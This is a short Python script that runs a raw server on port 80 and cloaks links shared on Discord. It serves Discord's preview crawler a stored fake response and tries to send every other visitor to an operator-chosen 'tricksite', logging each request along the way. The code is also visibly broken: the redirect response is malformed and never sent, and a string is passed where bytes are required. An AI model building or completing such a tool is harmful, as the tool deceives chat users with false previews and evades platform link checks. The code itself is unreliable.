import socketserver
import os
import re


#strings
help = 'commands:\n'
help += 'start\n'
help += 'exit\n'
#not sure if I still need this: 
socketstate = 0
tricksite = ''

#socket server class
class tcpsocket(socketserver.BaseRequestHandler):
    def handle(self):
        global socketstate
        global tricksite 

        self.data = self.request.recv(1024).strip()

        dat = ''
        try:
            dat = self.data.decode()
        except Exception as e:
            print(e)

        ##discord detection:
            #if dat.find('Discordbot') > -1:
            #    a = open(os.getcwd() + '')
        if dat.find('Discordbot') > -1:
           #load image response with header
            a = open(os.getcwd() + '/netcatresponse.txt')
            b = a.read()
            a.close()
            self.request.sendall(b) 
            #watch as packets come in:
            print('\n' + dat)
                
  
        if dat.find('Discordbot') == -1:
            responsepacket = 'c = b"HTTP/1.1 302 Found\nLocation: ' + tricksite
            print('\n' + dat)
            

#program go
def main():
    global help
    global socketstate
    global tricksite 
    HOST, PORT = ("", 80)
    a = input('Direct users to where?\n').rstrip()
    tricksite = a 

    with socketserver.TCPServer((HOST, PORT), tcpsocket) as server:
        server.serve_forever()
        

if __name__ == "__main__":
    main()